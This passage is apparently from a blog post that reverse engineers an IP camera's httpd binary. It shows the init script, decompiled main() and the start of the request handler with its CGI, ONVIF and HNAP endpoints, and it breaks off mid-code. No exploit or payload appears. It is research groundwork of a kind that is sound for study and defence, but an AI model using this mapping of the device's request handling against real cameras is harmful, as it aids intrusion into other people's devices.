class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># httpd: This starts and stops http server.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># chkconfig: 2345 90 10</span></span><br><span class="line"><span class="comment"># description: httpd</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># processname: /web/httpd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># automatically export variables to the environment</span></span><br><span class="line"><span class="built_in">set</span> -a</span><br><span class="line"></span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line">http_port=`/usr/sbin/userconfig -<span class="built_in">read</span> HTTP Port`</span><br><span class="line">https_enable=`/usr/sbin/userconfig -<span class="built_in">read</span> HTTPS Enable`</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">start</span></span>() {</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">"Starting httpd ... "</span></span><br><span class="line"><span class="built_in">cd</span> /web; ./httpd <span class="variable">$http_port</span> 1&amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"."</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">stop</span></span>() {</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">"Stopping httpd ... "</span></span><br><span class="line"><span class="built_in">kill</span> `pidof httpd`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"."</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">restart</span></span>() {</span><br><span class="line">stop</span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line">start</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">reload</span></span>() {</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">"Reloading httpd ... "</span></span><br><span class="line"><span class="built_in">kill</span> -USR1 `pidof httpd` </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></span><br><span class="line">start)</span><br><span class="line">start</span><br><span class="line">;;</span><br><span class="line">stop)</span><br><span class="line">stop</span><br><span class="line">;;</span><br><span class="line">restart)</span><br><span class="line">restart</span><br><span class="line">;;</span><br><span class="line">reload)</span><br><span class="line">reload</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line"><span class="built_in">echo</span> $<span class="string">"Usage <span class="variable">$0</span> {start|stop|restart}"</span></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> $?</span><br></pre></td></tr></tbody></table></figure><p>The httpd is a small web server, so I decided to analyze it, the relevant code is as follows.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *Peer6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">__pid_t</span> v11; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">__pid_t</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [sp+20h] [-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">7</span>]; <span class="comment">// [sp+21h] [-17h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [sp+28h] [-10h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *port; <span class="comment">// [sp+2Ch] [-Ch]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [sp+30h] [-8h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [sp+34h] [-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(argc - <span class="number">2</span>) &gt;= <span class="number">4</span> )</span><br><span class="line">  {</span><br><span class="line">    sub_401A40(<span class="string">"httpd"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  v13 = <span class="number">1</span>;</span><br><span class="line">  v14[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt;= <span class="number">2</span> )</span><br><span class="line">    port = argv[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    port = <span class="string">"80"</span>;</span><br><span class="line">  <span class="keyword">if</span> ( argc &lt; <span class="number">3</span> )</span><br><span class="line">    v4 = AuthType;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v4 = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">  AuthType = v4;</span><br><span class="line">  v5 = skOpen6(<span class="number">0</span>, port, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )</span><br><span class="line">    logx(<span class="number">3</span>, <span class="string">"%s %s %d"</span>, <span class="string">"httpd.c"</span>, <span class="string">"main"</span>, <span class="number">1275</span>);</span><br><span class="line">  setpgrp();</span><br><span class="line">  signal(<span class="number">13</span>, (<span class="type">__sighandler_t</span>)<span class="number">1</span>);</span><br><span class="line">  signal(<span class="number">18</span>, handler);</span><br><span class="line">  signal(<span class="number">2</span>, (<span class="type">__sighandler_t</span>)sub_401950);</span><br><span class="line">  signal(<span class="number">15</span>, (<span class="type">__sighandler_t</span>)sub_401950);</span><br><span class="line">  signal(<span class="number">16</span>, (<span class="type">__sighandler_t</span>)sub_402BF0);</span><br><span class="line">  signal(<span class="number">17</span>, (<span class="type">__sighandler_t</span>)sub_402BF0);</span><br><span class="line">  addr = mmap(<span class="number">0</span>, <span class="number">0x6590</span>u, <span class="number">3</span>, <span class="number">2049</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !addr )</span><br><span class="line">  {</span><br><span class="line">    fwrite(<span class="string">"httpd: mmap failed\\n"</span>, <span class="number">1u</span>, <span class="number">0x13</span>u, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  cfgRead(<span class="string">"HTTP"</span>, <span class="string">"SnapshotAuthentication"</span>, &amp;v13);</span><br><span class="line">  cfgRead(<span class="string">"HTTP"</span>, <span class="string">"LivevideoAuthentication"</span>, v14);</span><br><span class="line">  <span class="keyword">if</span> ( v13 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( v14[<span class="number">0</span>] )</span><br><span class="line">    {</span><br><span class="line">      fwrite(<span class="string">"httpd: Authentication Mode: Normal\\n"</span>, <span class="number">1u</span>, <span class="number">0x23</span>u, <span class="built_in">stderr</span>);</span><br><span class="line">      usrInit(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      fwrite(<span class="string">"httpd: Authentication Mode: Streaming pass\\n"</span>, <span class="number">1u</span>, <span class="number">0x2B</span>u, <span class="built_in">stderr</span>);</span><br><span class="line">      usrInit(<span class="number">3</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v14[<span class="number">0</span>] )</span><br><span class="line">  {</span><br><span class="line">    fwrite(<span class="string">"httpd: Authentication Mode: Snapshot pass\\n"</span>, <span class="number">1u</span>, <span class="number">0x2A</span>u, <span class="built_in">stderr</span>);</span><br><span class="line">    usrInit(<span class="number">2</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    fwrite(<span class="string">"httpd: Authentication Mode: Snapshot and streaming pass\\n"</span>, <span class="number">1u</span>, <span class="number">0x38</span>u, <span class="built_in">stderr</span>);</span><br><span class="line">    usrInit(<span class="number">4</span>);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>First put httpd on port 80 for listening, then a series of signal processing mechanisms will be registered.</p><p>Call <code>mmap()</code> function to map a memory space with a size of 0x6590 bytes, and assign the returned mapped address to the variable addr.</p><p>If assign success, It will read  the SnapshotAuthentication and LivevideoAuthentication values from configuration file, and initialize the user authentication mode based on these two values.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">sub_402BF0(<span class="number">17</span>);</span><br><span class="line">  AspInitial();</span><br><span class="line">  <span class="keyword">if</span> ( !dword_422C88 )</span><br><span class="line">  {</span><br><span class="line">    dest = (<span class="type">char</span> *)&amp;unk_4223D0;</span><br><span class="line">    v6 = v5;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      v7 = skSelect(v6, <span class="number">0</span>, <span class="number">500000</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">-1</span> )</span><br><span class="line">      {</span><br><span class="line">        logx(<span class="number">3</span>, <span class="string">"%s %s %d"</span>, <span class="string">"httpd.c"</span>, <span class="string">"main"</span>, <span class="number">1324</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 )</span><br><span class="line">      {</span><br><span class="line">        v8 = skAccept(v5);</span><br><span class="line">        v9 = v8;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &lt; <span class="number">0</span> )</span><br><span class="line">          logx(<span class="number">3</span>, <span class="string">"%s %s %d"</span>, <span class="string">"httpd.c"</span>, <span class="string">"main"</span>, <span class="number">1327</span>);</span><br><span class="line">        Peer6 = (<span class="type">const</span> <span class="type">char</span> *)skGetPeer6(v9, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, Peer6);</span><br><span class="line">        v11 = fork();</span><br><span class="line">        <span class="keyword">if</span> ( v11 == <span class="number">-1</span> )</span><br><span class="line">        {</span><br><span class="line">LABEL_31:</span><br><span class="line">          logx(<span class="number">3</span>, <span class="string">"%s %s %d"</span>, <span class="string">"httpd.c"</span>, <span class="string">"main"</span>, <span class="number">1337</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !v11 )</span><br><span class="line">        {</span><br><span class="line">          skClose(v5);</span><br><span class="line">          fd = v9;</span><br><span class="line">          v18 = dword_422414;</span><br><span class="line">          v17 = AuthType;</span><br><span class="line">          v12 = getpid();</span><br><span class="line">          sub_403038(v18, v17, v12, port);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">        }</span><br><span class="line">        skClose(v9);</span><br><span class="line">      }</span><br><span class="line">      usleep(<span class="number">0x30D40</span>u);</span><br><span class="line">      v6 = v5;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">while</span> ( !dword_422C88 );</span><br><span class="line">  }</span><br><span class="line">  skClose(v5);</span><br><span class="line">  munmap(addr, <span class="number">0x6590</span>u);</span><br><span class="line">  usrFree();</span><br><span class="line">  AspRelease();</span><br><span class="line">  kill(<span class="number">0</span>, <span class="number">15</span>);</span><br><span class="line">  waitpid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x40000000</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Call the <code>AspInitial()</code> function to initialize the corresponding ASP, enter the do while loop to monitor whether someone is connected.</p><p>If someone connects, fork a child process to call the <code>sub_403038</code> function to handle client requests.</p><p>Finally, call some function to close corresponding request. So then start analyzing <code>sub_403038</code> function</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">sub_403038</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, <span class="type">int</span> a6, <span class="type">int</span> a7, <span class="type">int</span> a8, <span class="type">const</span> <span class="type">char</span> *a9)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">v10</span>;</span> <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v11; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v12; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">bool</span> v14; <span class="comment">// dc</span></span><br><span class="line">  _BOOL4 v15; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v16; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v17; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v24; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">size_t</span> v25; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v27; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v28; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v29; <span class="comment">// $s7</span></span><br><span class="line">  <span class="type">char</span> *v30; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v31; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v32; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">char</span> *v33; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// $s7</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v35; <span class="comment">// [sp+20h] [-430h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v36[<span class="number">256</span>]; <span class="comment">// [sp+24h] [-42Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// [sp+124h] [-32Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v38; <span class="comment">// [sp+128h] [-328h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v39[<span class="number">256</span>]; <span class="comment">// [sp+12Ch] [-324h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v40[<span class="number">516</span>]; <span class="comment">// [sp+22Ch] [-224h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v41; <span class="comment">// [sp+430h] [-20h]</span></span><br><span class="line">  <span class="type">char</span> *v42; <span class="comment">// [sp+434h] [-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *v43; <span class="comment">// [sp+438h] [-18h]</span></span><br><span class="line">  <span class="type">char</span> *v44; <span class="comment">// [sp+43Ch] [-14h]</span></span><br><span class="line">  <span class="type">char</span> *v45; <span class="comment">// [sp+440h] [-10h]</span></span><br><span class="line">  <span class="type">char</span> *v46; <span class="comment">// [sp+444h] [-Ch]</span></span><br><span class="line">  <span class="type">char</span> *v47; <span class="comment">// [sp+448h] [-8h]</span></span><br><span class="line">  <span class="type">char</span> *format; <span class="comment">// [sp+44Ch] [-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (dword_422C8C &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    v10 = <span class="built_in">stderr</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = (<span class="type">const</span> <span class="type">char</span> **)reqInit(v10);</span><br><span class="line">  v35 = v11;</span><br><span class="line">  <span class="built_in">memset</span>(v36, <span class="number">0</span>, <span class="keyword">sizeof</span>(v36));</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v38 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_422C90 &amp;&amp; v11 )</span><br><span class="line">    v11[<span class="number">10</span>] = (<span class="type">const</span> <span class="type">char</span> *)<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (dword_422C8C &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s: connected\\n"</span>, a9);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  v41 = <span class="string">".cgi"</span>;</span><br><span class="line">  v42 = <span class="string">"/fvcgi/storage/localstorage_download.ts"</span>;</span><br><span class="line">  v44 = <span class="string">"/onvif/onvif_service"</span>;</span><br><span class="line">  v45 = <span class="string">"/cam/webapi_service"</span>;</span><br><span class="line">  v46 = <span class="string">"/hnap/hnap_service"</span>;</span><br><span class="line">  v47 = <span class="string">"/localrecording/"</span>;</span><br><span class="line">  format = <span class="string">"%s"</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( !v35 || reqRead(v35, fd) &lt; <span class="number">0</span> )</span><br><span class="line">      {</span><br><span class="line">LABEL_75:</span><br><span class="line">        <span class="keyword">if</span> ( (dword_422C8C &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">          <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s: disconnected\\n"</span>, a9);</span><br><span class="line">        sub_401950(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v35 )</span><br><span class="line">          reqFree(v35);</span><br><span class="line">        munmap(addr, <span class="number">0x6590</span>u);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      }</span><br><span class="line">      v12 = *v35;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">while</span> ( !**((_BYTE **)*v35 + <span class="number">6</span>) || !**((_BYTE **)v12 + <span class="number">5</span>) );</span><br><span class="line">    <span class="keyword">if</span> ( !a1 )</span><br><span class="line">      *(_DWORD *)v12 = <span class="number">0</span>;</span><br><span class="line">    v13 = sub_402B78();</span><br><span class="line">    v14 = v13 &gt;= <span class="number">1024</span>;</span><br><span class="line">    v15 = v13 &lt; <span class="number">3072</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( v15 )</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">      v38 = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      sleep(<span class="number">3u</span>);</span><br><span class="line">      v38 = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    readUpFwStatus(&amp;v38);</span><br><span class="line">    <span class="keyword">if</span> ( v38 == <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      v16 = <span 